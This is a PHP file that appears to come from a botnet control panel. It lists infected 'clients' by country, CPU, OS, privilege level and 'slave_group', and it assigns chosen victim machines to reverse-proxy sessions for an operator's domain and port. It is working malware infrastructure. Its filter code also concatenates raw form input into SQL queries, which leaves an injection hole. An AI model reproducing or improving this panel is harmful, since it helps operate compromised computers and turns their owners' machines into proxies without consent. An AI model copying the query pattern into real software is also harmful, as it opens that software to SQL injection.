<?php 
if(!isset($initialized))
{
	include('../../pages/404.php');
}

if(isset($_GET['action']) && $_GET['action'] == 'new_session')
{
	$query_country = "SELECT DISTINCT cc FROM clients "; 
	try 
	{ 
		$stmt_country = $db->prepare($query_country); 
		$stmt_country->execute(); 
	} 
	catch(PDOException $ex) 
	{ 
		DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); 
	} 
	$rows_country = $stmt_country->fetchAll();

	// CPU
	$query_cpu = "SELECT DISTINCT cpu FROM clients "; 
	try 
	{ 
		$stmt_cpu = $db->prepare($query_cpu); 
		$stmt_cpu->execute(); 
	} 
	catch(PDOException $ex) 
	{ 
		DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); 
	} 
	$rows_cpu = $stmt_cpu->fetchAll();

	//OS
	$query_os = "SELECT DISTINCT os FROM clients"; 
	try 
	{ 
		$stmt_os = $db->prepare($query_os); 
		$stmt_os->execute(); 
	} 
	catch(PDOException $ex) 
	{ 
		DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); 
	} 
	$rows_os = $stmt_os->fetchAll();
	// End of fetching info
}
elseif(isset($_GET['show']))
{
	
}
else
{
	if(isset($_POST['create_session']))
	{
		$expiration_date = 0;
		$domain = "";
		$port = 0;
		$client_number = 0;
		
		if(!empty($_POST['domain']))
		{
			$domain = $_POST['domain'];
		}
		else
		{
			$error = "Domain can not be empty!";
		}
		
		if(!empty($_POST['port']))
		{
			$port = $_POST['port'];
		}
		else
		{
			$error = "Port can not be empty!";
		}
		
		$session_id = md5($domain . $port);
		
		if(!empty($_POST['expiration_date']))
		{
			$expiration_date = strtotime($_POST['expiration_date']);
		}
		
		// Here we are going to check taskname in the database
		$query = "SELECT 1 FROM reverse_proxy WHERE session_id = :session_id LIMIT 1"; 
		$query_params = array(':session_id' => $session_id);
		try 
		{ 
			$stmt = $db->prepare($query); 
			$stmt->execute($query_params); 
		} 
		catch(PDOException $ex) 
		{ 
			DEBUG_PRINT("Failed to run query : " . $ex->getMessage()); 
		} 
		
		$row = $stmt->fetch(); 
		
		if($row) // If task with specified name is found
		{
			$error = 'Session with that domain and port already exists!';
		}
		
		if($error == "")
		{
			$query = "SELECT hwid FROM clients";
		
			$index = 0;
						
			if(!empty($_POST['filter_country']))
			{
				$count = count($_POST['filter_country']);
				//echo $count;
				$subindex = 0;
				if($count !== 0)
				{
					foreach($_POST['filter_country'] as $parameter)
					{
						if($index == 0)
						{
							if($count == 1)
							{
								$query = $query . " WHERE (cc = '" . $parameter . "')";
							}
							else
							{
								$query = $query . " WHERE (cc = '" . $parameter . "'";
							}
							$index++;
						}
						else
						{
							if($subindex == 0)
							{
								if($count == 1)
								{
									$query = $query . " AND (cc = '" . $parameter . "')";
								}
								else
								{
									$query = $query . " AND (cc = '" . $parameter . "'";
								}
							}
							elseif($subindex == $count - 1)
							{
								$query = $query . " OR cc = '" . $parameter . "')";
							}
							else
							{
								$query = $query . " OR cc = '" . $parameter . "'";
							}
							
						}
						$subindex++;
					}
				}
			}
			
			if(!empty($_POST['filter_status']))
			{
				$count = count($_POST['filter_status']);
				//echo $count;
				$subindex = 0;
				if($count !== 0)
				{
					foreach($_POST['filter_status'] as $parameter)
					{
						if($index == 0)
						{
							if($count == 1)
							{
								$query = $query . " WHERE (status = '" . $parameter . "')";
							}
							else
							{
								$query = $query . " WHERE (status = '" . $parameter . "'";
							}
							$index++;
						}
						else
						{
							if($subindex == 0)
							{
								if($count == 1)
								{
									$query = $query . " AND (status = '" . $parameter . "')";
								}
								else
								{
									$query = $query . " AND (status = '" . $parameter . "'";
								}
							}
							elseif($subindex == $count - 1)
							{
								$query = $query . " OR status = '" . $parameter . "')";
							}
							else
							{
								$query = $query . " OR status = '" . $parameter . "'";
							}
						}
						$subindex++;
					}
				}
			}
			
			if(!empty($_POST['filter_os']))
			{
				$count = count($_POST['filter_os']);
				//echo $count;
				$subindex = 0;
				if($count !== 0)
				{
					foreach($_POST['filter_os'] as $parameter)
					{
						if($index == 0)
						{
							if($count == 1)
							{
								$query = $query . " WHERE (os = '" . $parameter . "')";
							}
							else
							{
								$query = $query . " WHERE (os = '" . $parameter . "'";
							}
							$index++;
						}
						else
						{
							if($subindex == 0)
							{
								if($count == 1)
								{
									$query = $query . " AND (os = '" . $parameter . "')";
								}
								else
								{
									$query = $query . " AND (os = '" . $parameter . "'";
								}
							}
							elseif($subindex == $count - 1)
							{
								$query = $query . " OR os = '" . $parameter . "')";
							}
							else
							{
								$query = $query . " OR os = '" . $parameter . "'";
							}
							
						}
						$subindex++;
					}
				}	
			}
			
			if(!empty($_POST['filter_cpu']))
			{
				$count = count($_POST['filter_cpu']);
				//echo $count;
				$subindex = 0;
				if($count !== 0)
				{
					foreach($_POST['filter_cpu'] as $parameter)
					{
						if($index == 0)
						{
							if($count == 1)
							{
								$query = $query . " WHERE (cpu = '" . $parameter . "')";
							}
							else
							{
								$query = $query . " WHERE (cpu = '" . $parameter . "'";
							}
							$index++;
						}
						else
						{
							if($subindex == 0)
							{
								if($count == 1)
								{
									$query = $query . " AND (cpu = '" . $parameter . "')";
								}
								else
								{
									$query = $query . " AND (cpu = '" . $parameter . "'";
								}
							}
							elseif($subindex == $count - 1)
							{
								$query = $query . " OR cpu = '" . $parameter . "')";
							}
							else
							{
								$query = $query . " OR cpu = '" . $parameter . "'";
							}
						}
						$subindex++;
					}
				}
			}
			
			if(!empty($_POST['filter_user_privileges']))
			{
				$count = count($_POST['filter_user_privileges']);
				//echo $count;
				$subindex = 0;
				if($count !== 0)
				{
					foreach($_POST['filter_user_privileges'] as $parameter)
					{
						if($index == 0)
						{
							if($count == 1)
							{
								$query = $query . " WHERE (user_privileges = '" . $parameter . "')";
							}
							else
							{
								$query = $query . " WHERE (user_privileges = '" . $parameter . "'";
							}
							$index++;
						}
						else
						{
							if($subindex == 0)
							{
								if($count == 1)
								{
									$query = $query . " AND (user_privileges = '" . $parameter . "')";
								}
								else
								{
									$query = $query . " AND (user_privileges = '" . $parameter . "'";
								}
							}
							elseif($subindex == $count - 1)
							{
								$query = $query . " OR user_privileges = '" . $parameter . "')";
							}
							else
							{
								$query = $query . " OR user_privileges = '" . $parameter . "'";
							}
						}
						$subindex++;
					}
				}
			}
			
			if(!empty($_POST['filter_group']))
			{
				$count = count($_POST['filter_group']);
				//echo $count;
				$subindex = 0;
				if($count !== 0)
				{
					foreach($_POST['filter_group'] as $parameter)
					{
						if($index == 0)
						{
							if($count == 1)
							{
								$query = $query . " WHERE (slave_group = '" . $parameter . "')";
							}
							else
							{
								$query = $query . " WHERE (slave_group = '" . $parameter . "'";
							}
							$index++;
						}
						else
						{
							if($subindex == 0)
							{
								if($count == 1)
								{
									$query = $query . " AND (slave_group = '" . $parameter . "')";
								}
								else
								{
									$query = $query . " AND (slave_group = '" . $parameter . "'";
								}
							}
							elseif($subindex == $count - 1)
							{
								$query = $query . " OR slave_group = '" . $parameter . "')";
							}
							else
							{
								$query = $query . " OR slave_group = '" . $parameter . "'";
							}
						}
						$subindex++;
					}
				}
			}
			
			if(!empty($_POST['filter_os_arhitecture']))
			{
				$count = count($_POST['filter_os_arhitecture']);
				//echo $count;
				$subindex = 0;
				if($count !== 0)
				{
					foreach($_POST['filter_os_arhitecture'] as $parameter)
					{
						if($index == 0)
						{
							if($count == 1)
							{
								$query = $query . " WHERE (os_arhitecture = '" . $parameter . "')";
							}
							else
							{
								$query = $query . " WHERE (os_arhitecture = '" . $parameter . "'";
							}
							$index++;
						}
						else
						{
							if($subindex == 0)
							{
								if($count == 1)
								{
									$query = $query . " AND (os_arhitecture = '" . $parameter . "')";
								}
								else
								{
									$query = $query . " AND (os_arhitecture = '" . $parameter . "'";
								}
							}
							elseif($subindex == $count - 1)
							{
								$query = $query . " OR os_arhitecture = '" . $parameter . "')";
							}
							else
							{
								$query = $query . " OR os_arhitecture = '" . $parameter . "'";
							}
						}
						$subindex++;
					}
				}
			}
			
			//This one will be last one
			if(!empty($_POST['filter_limit']))
			{
				if(is_numeric($_POST['filter_limit']))
				{
					$query = $query . " LIMIT " . $_POST['filter_limit'];
				}
				else
				{
					$warning = "Entered execution limit was not a number so it has been discarded!";
				}
			}
		
			try 
			{ 
				// *These two statements run the query against your database table. 
				$stmt = $db->prepare($query); 
				$stmt->execute(); 
			} 
			catch(PDOException $ex) 
			{ 
				// Note: On a production website, you should not output $ex->getMessage(). 
				// It may provide an attacker with helpful information about your code.  
				DEBUG_PRINT("Failed to run query 2 : " . $ex->getMessage()); 
			} 
			
			$rows_hwid = $stmt->fetchAll();
			
			foreach($rows_hwid as $row_hwid)
			{
				$hwid = trim($row_hwid['hwid']);
				
				if($hwid == "") // No empty
				{
					continue;
				}
				
				$query = "
					INSERT INTO reverse_proxy ( 
					session_id,
					domain,
					port, 
					hwid,
					expiration
					) VALUES ( 
					:session_id,
					:domain,
					:port, 
					:hwid,
					:expiration
				)";
						
					
				$query_params = array( 
					':session_id' => $session_id,
					':domain' => $domain,
					':port' => $port, 
					':hwid' => $hwid,
					':expiration' => $expiration_date
				);
				
				try 
				{ 
					// Execute the query to create the user 
					$stmt = $db->prepare($query); 
					$stmt->execute($query_params);
					$client_number++;					
				} 
				catch(PDOException $ex) 
				{ 
					// Note: On a production website, you should not output $ex->getMessage(). 
					// It may provide an attacker with helpful information about your code.  
					DEBUG_PRINT("Failed to run query insert command : " . $ex->getMessage()); 
				}  
					
			}
			
			if($client_number > 0)
			{
				$notice = 'Proxy session created successfully for ' . $client_number . ' client/s!';
			}
			else
			{
				$warning = 'Proxy session has not been created! Zero clients matched the filter configuration!';
			}
		}
	}
	
	
}

if(isset($_GET['delete']))
{
	$query = "DELETE FROM reverse_proxy WHERE session_id = :session_id";
	$query_params = array(":session_id" => $_GET['delete']);
	
	try 
	{ 
		// *These two statements run the query against your database table. 
		$stmt = $db->prepare($query); 
		$stmt->execute($query_params);
		$notice = "Session deleted!";
	} 
	catch(PDOException $ex) 
	{ 
		// Note: On a production website, you should not output $ex->getMessage(). 
		// It may provide an attacker with helpful information about your code.  
		DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); 
	} 
}

?>